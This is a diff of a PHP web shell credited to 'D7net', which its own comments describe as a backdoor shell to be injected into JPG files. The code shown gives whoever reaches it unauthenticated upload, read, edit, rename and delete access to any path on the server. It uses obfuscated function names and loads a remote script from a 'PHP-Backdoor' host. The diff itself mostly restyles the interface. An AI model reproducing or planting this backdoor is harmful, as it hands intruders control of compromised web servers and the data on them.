@@ -2,7 +2,7 @@
 
 /*
     Shell Bypass 403 Forbidden / Auto Delete Shell / PHP Malware Detector / Minishell
-    Inject shell JPG By D7net
+    Inject Shell To JPG By D7net 
 */
 
 set_time_limit(0);
@@ -169,17 +169,6 @@ option {
   border-color: #fff;
   cursor: pointer;
 }
-.button {
-background-color: #000;
-border: 5px solid #000;
-color: #fff;
-line-height: 20px;
-
-}.button:hover {
-background-color: #fff;
-border-color: #59b1eb;
-color: #59b1eb;
-}
 body, a, a:link{cursor:url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), 
 	default;
 } 
@@ -191,6 +180,7 @@ body, a, a:link{cursor:url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAA
 <meta name="robots" content"noindex. nofollow"><link href="https://fonts.googleapis.com/css?family=VT323" rel="stylesheet">
 <title>'.$sname.'</title>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
 </head><body>';
 
 echo '<div style="color:#1240DE;margin-top:0;"><h1><center>' . $sname . '</center></h1></div>';
@@ -214,7 +204,7 @@ foreach ($paths as $id => $pat) {
     }
     echo "'>$pat</a>/";
 }
-echo '<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#ef6c00;margin-bottom:4px;"/><input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
+echo '<br>[ <a href="?">Home</a> ] </font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#ef6c00;margin-bottom:4px;"/><input type="submit" value="Upload" /></form></td></tr><tr><td colspan="2">';
 if (isset($_FILES['file'])) {
     if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
         echo '<center><font color="#00ff00">Upload Success!</font></center><br/>';
@@ -225,17 +215,17 @@ if (isset($_FILES['file'])) {
 echo '</td></tr><tr><td></table><div class="table-div"></div><input id="image" type="hidden">';
 echo '';
 if (isset($_GET['filesrc'])) {
-    echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>File: ';
+    echo '<br><center>Name File: ';
     echo "" . basename($_GET['filesrc']);
     "";
-    echo '</tr></td></table><br />';
-    echo ("<center><textarea readonly=''>" . htmlspecialchars($__fgetcon7s($_GET['filesrc'])) . "</textarea></center>");
+    echo ' <br><br><a href="?path='.$path.'"> < back </a><br><br>';
+    echo ("<center><textarea cols=100 rows=25 readonly=''>" . htmlspecialchars($__fgetcon7s($_GET['filesrc'])) . "</textarea></center>");
 } elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
     echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
     if ($_POST['opt'] == 'rename') {
         if (isset($_POST['newname'])) {
             if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
-                echo '<center><font color="#00ff00">Rename OK!</font></center><br />';
+                echo '<center><font color="#00ff00">Rename Success!</font></center><br />';
             } else {
                 echo '<center><font color="red">Rename Failed!</font></center><br />';
             }
@@ -252,7 +242,13 @@ if (isset($_GET['filesrc'])) {
             }
             fclose($fp);
         }
-        echo '<form method="POST"><textarea cols=80 rows=20 name="src">' . htmlspecialchars($__fgetcon7s($_POST['path'])) . '</textarea><br /><input type="hidden" name="path" value="' . $_POST['path'] . '"><input type="hidden" name="opt" value="edit"><input type="submit" value="Go" /></form>';
+        echo '
+        <form method="POST"><br><a href="?path='.$path.'"> < back </a><br><br>Edit File:
+        <td><center><textarea cols=120 rows=25 name="src">' . htmlspecialchars($__fgetcon7s($_POST['path'])) . '</textarea>
+        </div><br /><input type="hidden" name="path" value="' . $_POST['path'] . '"> 
+        <input type="hidden" name="opt" value="edit">
+        <input type="submit" value="Save"/>
+        ';
     }
     echo '</center>';
 } else {
@@ -274,11 +270,11 @@ if (isset($_GET['filesrc'])) {
     }
     echo '</center>';
     $_scdir = $__scdir($path);
-    echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"> <th><center>Name</center></th><th width="12%"><center>Size</center></th><th width="10%"><center>Permissions</center></th> <th width="15%"><center>Last Update</center></th><th width="11%"><center>Options</center></th></tr>';
+    echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"> <th width="1%"><center>Pic</center></th><th width="15%"><center>Name</center></th><th width="10%"><center>Size</center></th><th width="5%"><center>Type</center></th><th width="10%"><center>Permissions</center></th> <th width="15%"><center>Last Update</center></th><th width="11%"><center>Options</center></th></tr>';
     foreach ($_scdir as $dir) {
         if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
             continue;
-        echo "<tr><td><img src='https://cdn.iconscout.com/icon/free/png-128/folder-2219-1120694.png' alt='Smiley face' width='20' heght='20'> <a href=\'?path=$path/$dir\'>$dir</a></td><td><center>--</center></td><td><center>";
+        echo "<tr><td><img src='https://img.icons8.com/external-vectorslab-flat-vectorslab/2x/external-folder-project-management-and-web-marketing-vectorslab-flat-vectorslab.png' alt='Smiley face' width='25' heght='25'></td><td><a href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>Folder</center></td><td><center>";
         if (is_writable("$path/$dir"))
             echo '<font color="#00ff00">';
         elseif (!is_readable("$path/$dir"))
@@ -287,7 +283,7 @@ if (isset($_GET['filesrc'])) {
         if (is_writable("$path/$dir") || !is_readable("$path/$dir"))
             echo '</font>';
         echo "</center></td><td><center>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "";
-        echo "</center></td> <td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";
+        echo "</center></td> <td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"&#x276F;\" /></form></center></td></tr>";
     }
     foreach ($_scdir as $file) {
         if (!is_file("$path/$file"))
@@ -299,7 +295,7 @@ if (isset($_GET['filesrc'])) {
         } else {
             $size = $size . ' KB';
         }
-        echo "<tr><td><img src='https://img.icons8.com/fluency/2x/file.png' alt='Smiley face' width='22' heght='22'> <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>" . $size . "</center></td><td><center>";
+        echo "<tr><td><img src='https://img.icons8.com/external-kmg-design-outline-color-kmg-design/2x/external-file-web-hosting-kmg-design-outline-color-kmg-design.png' alt='Smiley face' width='25' heght='25'></td><td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>" . $size . "</center></td><td><center>File</center></td><td><center>";
         if (is_writable("$path/$file"))
             echo '<font color="#00ff00">';
         elseif (!is_readable("$path/$file"))
@@ -308,7 +304,7 @@ if (isset($_GET['filesrc'])) {
         if (is_writable("$path/$file") || !is_readable("$path/$file"))
             echo '</font>';
         echo "</center></td><td><center>" . date("d-M-Y H:i", filemtime("$path/$file")) . "";
-        echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";
+        echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"&#x276F;\" /></form></center></td></tr>";
     }
     echo '</table></div>';
 }
@@ -343,7 +339,7 @@ function perms($file)
     $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
     return $info;
 }
-echo '<br><center>&copy; <span id="footer"></span> 2018. | D7net</center><br>';
+echo '<br><center>&copy; <span id="footer"></span> 2018. | Recode by D7net</center><br>';
 echo '<script type="text/javascript" src="//zerobyte-id.github.io/PHP-Backdoor/inc/footer.js"></script>';
 echo '</body></html><!-- EOF -->';
 ?>
